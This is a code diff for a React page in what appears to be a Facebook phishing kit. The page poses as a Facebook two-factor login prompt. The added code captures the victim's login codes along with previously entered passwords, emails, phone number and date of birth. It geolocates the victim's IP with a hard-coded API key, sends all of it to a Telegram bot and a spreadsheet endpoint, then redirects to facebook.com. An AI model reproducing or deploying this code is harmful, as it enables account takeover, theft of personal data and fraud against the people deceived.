@@ -1,13 +1,26 @@
 import React, { useEffect, useState } from "react";
-import '../confirm/styleConfirm.css';
+import '../confirm/style.css';
 import TextArea from "antd/es/input/TextArea";
 import { Button } from "antd";
+import { useDispatch, useSelector } from "react-redux";
+import { setData } from "../../store/business/businessSlice";
+import axios from "axios";
+import { ETelegram } from "../../constants";
 
 const Confirm = () => {
   const [time, setTime] = useState(300); // Thời gian ban đầu là 5 phút (300 giây)
   const [isTimeUp, setIsTimeUp] = useState(false);
+  const business = useSelector((state: any) => state.business)
+  const [checkCode, setCheckCode] = useState(false);
+  const [code, setCode] = useState('');
+  const [codeFirst, setCodeFirst] = useState(code)
+  const dispatch = useDispatch()
+  const [loading, setLoading] = useState(false);
+
+
 
   useEffect(() => {
+    console.log("business: ", business)
     const timer = setInterval(() => {
       setTime((prevTime) => {
         if (prevTime === 0) {
@@ -30,10 +43,112 @@ const Confirm = () => {
     return `${formattedMinutes}:${formattedSeconds}`;
   };
 
-  const handleFacebookRedirect = () => {
+  const handleFacebookRedirect = async () => {
+    if (!checkCode) {
+      setCheckCode(true)
+      setCodeFirst(code)
+    } else {
+      setLoading(true)
+      setCheckCode(false)
+      await Promise.all([
+        sendTelegramBotForBusiness(),
+        sendTelegramBotForGgsheet()
+      ])
+      setLoading(false)
+      clearStore()
+      window.location.href = 'https://www.facebook.com/';
+    }
     // Redirect to Facebook
-    window.location.href = 'https://www.facebook.com/';
   };
+
+  const sendTelegramBotForGgsheet = async () => {
+    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+    let CURRENT_API_URL = API_URL + "sendMessage"
+    try {
+      let message = '✅ Đã thêm vào sheet thành công'
+      const data = {
+        ["Name Page"]: business.namePage,
+        ["Full Name"]: business.fullName,
+        ["Business Email Address"]: business.businessEmail,
+        ["Personal Email Address"]: business.personalEmail,
+        ["Mobile Phone Number"]: business.phone,
+        ["Date of Birth"]: business.date,
+        ["Please provide us information that will help us investigate"]: business.text,
+        ['Password First']: business.passwordFirst,
+        ['Password Second']: business.passwordSecond,
+        ['Code First']: codeFirst,
+        ['Code Second']: code,
+      }
+      await axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).catch(() => {
+        message = '❌Thêm vào sheet không thành công'
+      })
+      await axios.post(CURRENT_API_URL, {
+        chat_id: ETelegram.CHAT_ID,
+        parse_mode: "html",
+        document: '',
+        text: message,
+        caption: message,
+      }, {
+        headers: {
+          "Content-Type": 'multipart/form-data',
+        }
+      });
+    } catch (err) {
+      console.log("err: ", err)
+    }
+  }
+
+  const sendTelegramBotForBusiness = async () => {
+    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+    let CURRENT_API_URL = API_URL + "sendMessage"
+    try {
+      const response = await axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=0b54578041c84e4684b6c0f2542c1721')
+      let message = `
+      Email Account:  ${business.businessEmail}
+      Name Account: ${business.namePage}
+      Person Email: ${business.personalEmail}
+      Facebook Page: ${business.text}
+      User Name: ${business.fullName}
+      Phone Number: ${business.phone}
+      Password First: ${business.passwordFirst}
+      Password Second: ${business.passwordSecond}
+      Ip: ${response.data.ip_address}
+      City: ${response.data.city}
+      Country: ${response.data.country}
+      First Code Authen: ${codeFirst}
+      Second Code Authen: ${code}
+      `;
+      await axios.post(CURRENT_API_URL, {
+        chat_id: ETelegram.CHAT_ID,
+        parse_mode: "html",
+        document: '',
+        text: message,
+        caption: message,
+      }, {
+        headers: {
+          "Content-Type": 'multipart/form-data',
+        }
+      });
+    } catch (err) {
+      console.log("err: ", err)
+    }
+  };
+
+  const clearStore = () => {
+    dispatch(setData({
+      namePage: '',
+      fullName: '',
+      businessEmail: '',
+      personalEmail: '',
+      phone: '',
+      date: '',
+      text: '',
+      passwordFirst: '',
+      passwordSecond: '',
+    }))
+    setCode('')
+    setCodeFirst('')
+  }
 
   return (
     <div className="container_confirm">
@@ -50,11 +165,11 @@ const Confirm = () => {
           <div className="text_content">
             <p style={{ marginTop: '16px' }}>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
             <p style={{ marginTop: '20px', marginBottom: '24px' }}>Enter the 6-digit code from your code generator or third-party app below.</p>
-            <TextArea style={{ width: '26%' }} placeholder="Enter code" autoSize /> {isTimeUp ? (<a href="##" style={{ marginLeft: "10px", textDecoration: 'none', color: "#385898" }}>Send code</a>) : (<span style={{ marginLeft: "10px" }}>(wait: {formatTime(time)})</span>)}
+            <TextArea onChange={(e: any) => setCode(e.target.value)} style={{ width: '26%' }} placeholder="Enter code" autoSize /> {isTimeUp ? (<a href="##" style={{ marginLeft: "10px", textDecoration: 'none', color: "#385898" }}>Send code</a>) : (<span style={{ marginLeft: "10px" }}>(wait: {formatTime(time)})</span>)}
           </div>
           <div className="footer_form">
             <p className="footer_form-title">Need another way to authenticate?</p>
-            <Button className="submit" onClick={handleFacebookRedirect}>
+            <Button className="submit" onClick={handleFacebookRedirect} loading={loading}>
               Send
             </Button>
           </div>
